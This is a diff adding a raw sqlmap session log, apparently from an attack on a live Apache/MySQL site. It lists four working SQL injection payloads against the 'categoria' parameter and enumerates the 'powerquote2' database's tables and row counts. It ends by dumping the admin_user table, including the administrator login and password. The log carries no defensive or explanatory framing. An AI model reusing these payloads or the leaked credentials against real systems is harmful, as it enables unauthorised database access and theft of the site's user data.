@@ -1,0 +1,137 @@
+sqlmap identified the following injection point(s) with a total of 54 HTTP(s) requests:
+---
+Parameter: categoria (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: categoria=3 AND 4610=4610
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: categoria=3 AND (SELECT 5774 FROM(SELECT COUNT(*),CONCAT(0x716b7a7a71,(SELECT (ELT(5774=5774,1))),0x7178627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: categoria=3 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 20 columns
+    Payload: categoria=3 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b7a7a71,0x416e4f6f504f66586764474a6948777374524f45514f74665055565a55575762775565556658436e,0x7178627171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ngvT
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] information_schema
+[*] powerquote2
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: categoria (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: categoria=3 AND 4610=4610
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: categoria=3 AND (SELECT 5774 FROM(SELECT COUNT(*),CONCAT(0x716b7a7a71,(SELECT (ELT(5774=5774,1))),0x7178627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: categoria=3 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 20 columns
+    Payload: categoria=3 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b7a7a71,0x416e4f6f504f66586764474a6948777374524f45514f74665055565a55575762775565556658436e,0x7178627171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ngvT
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: powerquote2
+[19 tables]
++-----------------+
+| admin_user      |
+| ajuda           |
+| analise_tecnica |
+| bolsas          |
+| bolsas_produtos |
+| cadastro        |
+| categoria_ajuda |
+| config          |
+| dadosusuario    |
+| news            |
+| newsletter      |
+| origem          |
+| parceiros       |
+| produto         |
+| sinal           |
+| tipo_bolsas     |
+| usuario         |
+| usuario_bolsas  |
+| usuario_produto |
++-----------------+
+
+Database: powerquote2
++-----------------+---------+
+| Table           | Entries |
++-----------------+---------+
+| newsletter      | 4923    |
+| usuario_bolsas  | 1575    |
+| usuario         | 1093    |
+| usuario_produto | 723     |
+| news            | 626     |
+| cadastro        | 366     |
+| dadosusuario    | 364     |
+| bolsas_produtos | 134     |
+| ajuda           | 65      |
+| bolsas          | 41      |
+| analise_tecnica | 8       |
+| sinal           | 8       |
+| origem          | 6       |
+| tipo_bolsas     | 6       |
+| categoria_ajuda | 5       |
+| produto         | 5       |
+| parceiros       | 3       |
+| admin_user      | 1       |
+| config          | 1       |
++-----------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: categoria (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: categoria=3 AND 4610=4610
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: categoria=3 AND (SELECT 5774 FROM(SELECT COUNT(*),CONCAT(0x716b7a7a71,(SELECT (ELT(5774=5774,1))),0x7178627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: categoria=3 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 20 columns
+    Payload: categoria=3 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b7a7a71,0x416e4f6f504f66586764474a6948777374524f45514f74665055565a55575762775565556658436e,0x7178627171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ngvT
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: powerquote2
+Table: admin_user
+[1 entry]
++----+------+---------------+--------------+---------+
+| id | tipo | nome          | senha        | login   |
++----+------+---------------+--------------+---------+
+| 18 | 1    | Administrador | ZBQy9NWDIaNm | pqadmin |
++----+------+---------------+--------------+---------+
+
